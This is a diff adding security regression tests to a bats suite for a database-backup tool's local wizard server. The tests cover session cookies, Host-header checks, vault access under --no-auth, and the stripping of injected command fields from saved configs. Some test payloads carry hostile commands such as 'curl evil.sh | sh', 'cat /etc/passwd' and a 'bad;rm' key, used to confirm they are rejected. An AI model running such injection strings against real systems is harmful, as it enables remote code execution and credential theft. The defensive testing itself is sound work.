@@ -8,6 +8,21 @@ load '../helpers/common'
 
 WIZ_REPO_ROOT="$(cd "${BATS_TEST_DIRNAME}/../.." && pwd)"
 
+# The server is launched with --port 0 (OS-assigned) and prints the real bound
+# port on startup; poll the server log for it and set WIZ_PORT. This avoids the
+# old bind-a-port/close-it/respawn-on-it TOCTOU that flaked under CI load (#176).
+_wiz_wait_for_port() {
+  local _
+  for _ in $(seq 1 50); do
+    WIZ_PORT="$(grep -m1 '^DBX_WIZARD_PORT=' "$WIZ_SCRATCH/server.log" 2>/dev/null | cut -d= -f2)"
+    [[ -n "$WIZ_PORT" ]] && return 0
+    sleep 0.1
+  done
+  echo "wizard server never reported its port. server.log:" >&2
+  cat "$WIZ_SCRATCH/server.log" >&2 || true
+  return 1
+}
+
 setup() {
   setup_dbx_env
 
@@ -184,7 +199,6 @@ SH
   export WIZ_SCRATCH
 
   WIZ_TOKEN="testtoken1234567890abcdef00000000"
-  WIZ_PORT="$(python3 -c "import socket; s=socket.socket(); s.bind(('127.0.0.1',0)); print(s.getsockname()[1]); s.close()")"
   WIZ_DONE="$WIZ_SCRATCH/done"
 
   # Sandbox the audit dir under the scratch tree so /api/audit-log doesn't
@@ -193,7 +207,7 @@ SH
   WIZ_AUDIT_DIR="$WIZ_SCRATCH/audit"
 
   python3 "$WIZ_REPO_ROOT/lib/wizard-server.py" \
-    --port "$WIZ_PORT" \
+    --port 0 \
     --token "$WIZ_TOKEN" \
     --html             "$WIZ_REPO_ROOT/lib/wizard.html" \
     --form-fragment     "$WIZ_REPO_ROOT/lib/wizard-form.html" \
@@ -216,6 +230,8 @@ SH
     >"$WIZ_SCRATCH/server.log" 2>&1 &
   WIZ_PID=$!
 
+  _wiz_wait_for_port
+
   # Wait for the server to bind (max ~2s).
   for _ in $(seq 1 20); do
     if curl -s -o /dev/null "http://127.0.0.1:$WIZ_PORT/?token=$WIZ_TOKEN"; then break; fi
@@ -231,6 +247,43 @@ teardown() {
 }
 
 api() { echo "http://127.0.0.1:$WIZ_PORT$1?token=$WIZ_TOKEN"; }
+
+# Relaunch the wizard server on the same port with caller-supplied auth/extra
+# flags (e.g. `restart_wiz --no-auth` or `restart_wiz --token "$WIZ_TOKEN"`).
+# Kills the setup() instance and rebinds WIZ_PID so teardown() still cleans up.
+restart_wiz() {
+  kill "$WIZ_PID" 2>/dev/null
+  wait "$WIZ_PID" 2>/dev/null || true
+  python3 "$WIZ_REPO_ROOT/lib/wizard-server.py" \
+    --port 0 "$@" \
+    --html             "$WIZ_REPO_ROOT/lib/wizard.html" \
+    --form-fragment    "$WIZ_REPO_ROOT/lib/wizard-form.html" \
+    --backups-fragment "$WIZ_REPO_ROOT/lib/wizard-backups.html" \
+    --backup-fragment  "$WIZ_REPO_ROOT/lib/wizard-backup.html" \
+    --restore-fragment "$WIZ_REPO_ROOT/lib/wizard-restore.html" \
+    --schedule-fragment "$WIZ_REPO_ROOT/lib/wizard-schedule.html" \
+    --runs-fragment    "$WIZ_REPO_ROOT/lib/wizard-runs.html" \
+    --dashboard-fragment "$WIZ_REPO_ROOT/lib/wizard-dashboard.html" \
+    --vault-fragment   "$WIZ_REPO_ROOT/lib/wizard-vault.html" \
+    --storage-fragment "$WIZ_REPO_ROOT/lib/wizard-storage.html" \
+    --scrub-fragment   "$WIZ_REPO_ROOT/lib/wizard-scrub.html" \
+    --analyze-fragment "$WIZ_REPO_ROOT/lib/wizard-analyze.html" \
+    --config-path      "$WIZ_SCRATCH/config.json" \
+    --data-dir         "$WIZ_SCRATCH/data" \
+    --audit-dir        "$WIZ_AUDIT_DIR" \
+    --dbx-bin          "$WIZ_SCRATCH/dbx" \
+    --lib-dir          "$WIZ_REPO_ROOT/lib" \
+    --done-marker      "$WIZ_DONE" \
+    >"$WIZ_SCRATCH/server.log" 2>&1 &
+  WIZ_PID=$!
+  # The `>` above truncated server.log, so this reads the NEW server's port,
+  # not the one setup() started.
+  _wiz_wait_for_port
+  for _ in $(seq 1 20); do
+    if curl -s -o /dev/null "http://127.0.0.1:$WIZ_PORT/"; then break; fi
+    sleep 0.1
+  done
+}
 
 @test "GET / with valid token serves composed HTML" {
   run curl -s "$(api /)"
@@ -254,6 +307,61 @@ api() { echo "http://127.0.0.1:$WIZ_PORT$1?token=$WIZ_TOKEN"; }
   run curl -s -o /dev/null -w "%{http_code}" "http://127.0.0.1:$WIZ_PORT/"
   [ "$status" -eq 0 ]
   [ "$output" = "403" ]
+}
+
+# ----------------------------------------------------------------------------
+# #123: the URL token bootstraps an HttpOnly session cookie on first load, so
+# it stops leaking via browser/shell history, Referer, and embedded URLs.
+# ----------------------------------------------------------------------------
+
+@test "GET / with URL token mints an HttpOnly SameSite=Strict session cookie" {
+  run curl -s -D - -o /dev/null "$(api /)"
+  [ "$status" -eq 0 ]
+  [[ "$output" == *"Set-Cookie: dbx_token=$WIZ_TOKEN"* ]]
+  [[ "$output" == *"HttpOnly"* ]]
+  [[ "$output" == *"SameSite=Strict"* ]]
+  [[ "$output" == *"Path=/"* ]]
+}
+
+@test "every response carries Referrer-Policy: no-referrer" {
+  run curl -s -D - -o /dev/null "$(api /)"
+  [[ "$output" == *"Referrer-Policy: no-referrer"* ]]
+  # …including API responses and 403s.
+  run curl -s -D - -o /dev/null "$(api /api/backups)"
+  [[ "$output" == *"Referrer-Policy: no-referrer"* ]]
+  run curl -s -D - -o /dev/null "http://127.0.0.1:$WIZ_PORT/?token=NOPE"
+  [[ "$output" == *"Referrer-Policy: no-referrer"* ]]
+}
+
+@test "the session cookie authenticates a request with no URL token" {
+  # GET an API endpoint with ONLY the cookie (no ?token=) — must succeed.
+  run curl -s -o /dev/null -w "%{http_code}" \
+    -H "Cookie: dbx_token=$WIZ_TOKEN" "http://127.0.0.1:$WIZ_PORT/api/backups"
+  [ "$status" -eq 0 ]
+  [ "$output" = "200" ]
+}
+
+@test "POST /save authenticates by cookie alone (no URL token)" {
+  run curl -s -o /dev/null -w "%{http_code}" -X POST \
+    -H "Content-Type: application/json" -H "Cookie: dbx_token=$WIZ_TOKEN" \
+    -d '{"hosts":{},"defaults":{}}' "http://127.0.0.1:$WIZ_PORT/save"
+  [ "$status" -eq 0 ]
+  [ "$output" = "200" ]
+}
+
+@test "a bad session cookie is rejected with 403" {
+  run curl -s -o /dev/null -w "%{http_code}" \
+    -H "Cookie: dbx_token=WRONG" "http://127.0.0.1:$WIZ_PORT/api/backups"
+  [ "$status" -eq 0 ]
+  [ "$output" = "403" ]
+}
+
+@test "served HTML embeds no token (save URL is /save, cookie-authed)" {
+  run curl -s "$(api /)"
+  [ "$status" -eq 0 ]
+  [[ "$output" == *'data-save-url="/save"'* ]]
+  # The real token must never appear in the page body.
+  [[ "$output" != *"$WIZ_TOKEN"* ]]
 }
 
 @test "GET /api/backups enumerates DATA_DIR and reads meta.json" {
@@ -720,6 +828,70 @@ JSON
     -d '"justastring"' "$(api /save)"
   [ "$status" -eq 0 ]
   [ "$output" = "400" ]
+}
+
+# ----------------------------------------------------------------------------
+# #125: config.json is a trust boundary. A wizard client must not be able to
+# plant an eval-bearing field (password_cmd / *_cmd / command templates) via a
+# config-save, or the next host op runs it (config-write -> RCE). On save these
+# fields may come only from the trusted on-disk config, never the client.
+# ----------------------------------------------------------------------------
+
+@test "POST /save drops a client-injected hosts.*.password_cmd (no trusted value)" {
+  cat > "$WIZ_SCRATCH/config.json" <<'JSON'
+{ "hosts": { "prod": { "type": "postgres", "user": "u" } } }
+JSON
+  run curl -s -X POST -H "Content-Type: application/json" \
+    -d '{"hosts":{"prod":{"type":"postgres","user":"u","password_cmd":"touch /tmp/pwned"}},"defaults":{}}' \
+    "$(api /save)"
+  [ "$status" -eq 0 ]
+  [[ "$output" == *"\"ok\":true"* ]]
+  run cat "$WIZ_SCRATCH/config.json"
+  [[ "$output" != *"password_cmd"* ]]
+  [[ "$output" != *"/tmp/pwned"* ]]
+}
+
+@test "POST /save cannot override an existing (CLI-set) password_cmd" {
+  cat > "$WIZ_SCRATCH/config.json" <<'JSON'
+{ "hosts": { "prod": { "type": "postgres", "user": "u", "password_cmd": "op read op://vault/prod/pw" } } }
+JSON
+  run curl -s -X POST -H "Content-Type: application/json" \
+    -d '{"hosts":{"prod":{"type":"postgres","user":"u","password_cmd":"curl evil.sh | sh"}},"defaults":{}}' \
+    "$(api /save)"
+  [ "$status" -eq 0 ]
+  run cat "$WIZ_SCRATCH/config.json"
+  # Trusted value preserved, injected one rejected.
+  [[ "$output" == *"op read op://vault/prod/pw"* ]]
+  [[ "$output" != *"evil.sh"* ]]
+}
+
+@test "POST /save restores a CLI-set password_cmd the form omitted (no data loss)" {
+  cat > "$WIZ_SCRATCH/config.json" <<'JSON'
+{ "hosts": { "prod": { "type": "postgres", "user": "u", "password_cmd": "op read op://vault/prod/pw" } } }
+JSON
+  # Form re-saves the host without password_cmd (the form doesn't model it).
+  run curl -s -X POST -H "Content-Type: application/json" \
+    -d '{"hosts":{"prod":{"type":"postgres","user":"u","port":5432}},"defaults":{}}' \
+    "$(api /save)"
+  [ "$status" -eq 0 ]
+  run cat "$WIZ_SCRATCH/config.json"
+  [[ "$output" == *"op read op://vault/prod/pw"* ]]
+  [[ "$output" == *"5432"* ]]
+}
+
+@test "POST /save drops injected notification + storage eval fields" {
+  printf '{ "hosts": {} }' > "$WIZ_SCRATCH/config.json"
+  run curl -s -X POST -H "Content-Type: application/json" \
+    -d '{"hosts":{},"defaults":{},"notifications":{"command":{"on_success":"touch /tmp/x"},"slack":{"webhook_url_cmd":"id"}},"storage":{"type":"s3","s3":{"bucket":"b","secret_key_cmd":"cat /etc/passwd"}},"storages":{"r2":{"s3":{"secret_key_cmd":"whoami"}}}}' \
+    "$(api /save)"
+  [ "$status" -eq 0 ]
+  run cat "$WIZ_SCRATCH/config.json"
+  [[ "$output" != *"on_success"* ]]
+  [[ "$output" != *"webhook_url_cmd"* ]]
+  [[ "$output" != *"secret_key_cmd"* ]]
+  [[ "$output" != *"/etc/passwd"* ]]
+  # Non-eval sibling fields in the same blocks still persist.
+  [[ "$output" == *"\"bucket\": \"b\""* ]]
 }
 
 # ----------------------------------------------------------------------------
@@ -1245,6 +1417,28 @@ JSONL
   run curl -s -o /dev/null -w "%{http_code}" "$(api /api/vault/get)&key=bad;rm"
   [ "$status" -eq 0 ]
   [ "$output" = "400" ]
+}
+
+# #124: vault/get returns a cleartext secret, so it must refuse whenever the
+# token gate is disabled (--no-auth / `dbx serve --no-token`) — otherwise anyone
+# reaching the port exfiltrates every stored secret with one curl. The loopback
+# requirement is exercised by the existing token-mode success test above (the
+# setup server binds 127.0.0.1); the no-auth refusal needs a relaunch.
+@test "GET /api/vault/get is refused under --no-auth (403)" {
+  curl -s -X POST -H "Content-Type: application/json" \
+    -d '{"key":"prod-mysql","value":"hunter2"}' "$(api /api/vault/set)" >/dev/null
+  restart_wiz --no-auth
+  # Sanity: --no-auth otherwise serves vault endpoints (list works, no token).
+  run curl -s -o /dev/null -w "%{http_code}" "http://127.0.0.1:$WIZ_PORT/api/vault/list"
+  [ "$output" = "200" ]
+  # But the cleartext-secret endpoint is refused.
+  run curl -s -o /tmp/wiz_vget_body -w "%{http_code}" \
+    "http://127.0.0.1:$WIZ_PORT/api/vault/get?key=prod-mysql"
+  [ "$status" -eq 0 ]
+  [ "$output" = "403" ]
+  run cat /tmp/wiz_vget_body
+  [[ "$output" != *"hunter2"* ]]
+  rm -f /tmp/wiz_vget_body
 }
 
 @test "POST /api/vault/set rejects bad key shape with 400" {
@@ -2106,4 +2300,50 @@ JSON
   # Nothing was written — the bad name aborted before the config patch.
   run python3 -c "import json;print('exclude_data' in json.load(open('$WIZ_SCRATCH/config.json'))['hosts']['prod']['databases']['myapp'])"
   [ "$output" = "False" ]
+}
+
+# ---------------------------------------------------------------------------
+# #126: Host-header validation (DNS-rebinding hardening). setup() binds the
+# default 127.0.0.1 (concrete) in token mode; restart_wiz relaunches with the
+# flags under test. curl overrides the Host header with -H.
+# ---------------------------------------------------------------------------
+
+@test "Host: concrete bind refuses a foreign Host even with a valid token (#126)" {
+  run curl -s -o /dev/null -w "%{http_code}" -H "Host: evil.example" "$(api /)"
+  [ "$output" = "403" ]
+}
+
+@test "Host: loopback Host is always allowed (#126)" {
+  run curl -s -o /dev/null -w "%{http_code}" -H "Host: 127.0.0.1" "$(api /)"
+  [ "$output" = "200" ]
+}
+
+@test "Host: --no-auth refuses a non-allow-listed Host (#126)" {
+  restart_wiz --host 0.0.0.0 --no-auth
+  run curl -s -o /dev/null -w "%{http_code}" -H "Host: evil.example" "http://127.0.0.1:$WIZ_PORT/"
+  [ "$output" = "403" ]
+}
+
+@test "Host: --no-auth allows an --allow-list-ed Host (#126)" {
+  restart_wiz --host 0.0.0.0 --no-auth --allow-host good.example
+  run curl -s -o /dev/null -w "%{http_code}" -H "Host: good.example" "http://127.0.0.1:$WIZ_PORT/"
+  [ "$output" = "200" ]
+}
+
+@test "Host: --no-auth still allows a loopback Host (#126)" {
+  restart_wiz --host 0.0.0.0 --no-auth
+  run curl -s -o /dev/null -w "%{http_code}" -H "Host: 127.0.0.1" "http://127.0.0.1:$WIZ_PORT/"
+  [ "$output" = "200" ]
+}
+
+@test "Host: token-mode wildcard bind is permissive for a foreign Host (#126)" {
+  restart_wiz --host 0.0.0.0 --token "$WIZ_TOKEN"
+  run curl -s -o /dev/null -w "%{http_code}" -H "Host: evil.example" "http://127.0.0.1:$WIZ_PORT/?token=$WIZ_TOKEN"
+  [ "$output" = "200" ]
+}
+
+@test "Host: comma-separated --allow-host accepts each listed Host (#126)" {
+  restart_wiz --host 0.0.0.0 --no-auth --allow-host "a.example,b.example"
+  run curl -s -o /dev/null -w "%{http_code}" -H "Host: b.example" "http://127.0.0.1:$WIZ_PORT/"
+  [ "$output" = "200" ]
 }
